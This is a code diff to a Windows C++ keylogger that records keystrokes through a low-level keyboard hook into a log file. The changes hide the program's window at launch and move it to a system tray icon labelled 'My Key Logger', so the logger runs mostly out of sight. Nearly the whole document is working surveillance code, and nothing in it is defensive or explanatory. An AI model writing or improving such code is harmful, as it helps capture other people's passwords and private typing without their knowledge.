@@ -1,9 +1,11 @@
 #include <Windows.h>
+#include <Shellapi.h>
 #include <fstream>
 
 // Global variables
 std::ofstream logFile;
 HHOOK keyboardHook = NULL;
+NOTIFYICONDATA notifyIconData;
 
 // Function to handle key press and write to log file
 void HandleKeyPress(DWORD vkCode)
@@ -46,6 +48,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
     switch (uMsg)
     {
         case WM_CREATE:
+        {
             // Set up the keyboard hook
             keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(NULL), 0);
             if (keyboardHook == NULL)
@@ -54,7 +57,22 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
                 DestroyWindow(hwnd);
                 return -1;
             }
+
+            // Set up the system tray icon
+            ZeroMemory(&notifyIconData, sizeof(NOTIFYICONDATA));
+            notifyIconData.cbSize = sizeof(NOTIFYICONDATA);
+            notifyIconData.hWnd = hwnd;
+            notifyIconData.uID = 1;
+            notifyIconData.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
+            notifyIconData.uCallbackMessage = WM_USER + 1;
+            notifyIconData.hIcon = LoadIcon(NULL, IDI_APPLICATION);
+            lstrcpy(notifyIconData.szTip, "My Key Logger");
+            Shell_NotifyIcon(NIM_ADD, &notifyIconData);
+
+            // Minimize the window
+            ShowWindow(hwnd, SW_HIDE);
             break;
+        }
 
         case WM_CLOSE:
             // Unhook the keyboard hook
@@ -63,11 +81,27 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
                 UnhookWindowsHookEx(keyboardHook);
                 keyboardHook = NULL;
             }
+
+            // Remove the system tray icon
+            Shell_NotifyIcon(NIM_DELETE, &notifyIconData);
+
             DestroyWindow(hwnd);
             break;
 
         case WM_DESTROY:
             PostQuitMessage(0);
+            break;
+
+        case WM_USER + 1:
+            // Handle system tray icon messages
+            switch (lParam)
+            {
+                case WM_LBUTTONDOWN:
+                    // Show or hide the window when the left mouse button is clicked on the system tray icon
+                    ShowWindow(hwnd, IsWindowVisible(hwnd) ? SW_HIDE : SW_SHOW);
+                    break;
+            }
+
             break;
 
         default:
@@ -113,15 +147,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return -1;
     }
 
-    // Show the window
-    ShowWindow(hwnd, nCmdShow);
-
     // Message loop
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0))
     {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
+        if (!TranslateAccelerator(hwnd, NULL, &msg))
+        {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
     }
 
     // Cleanup
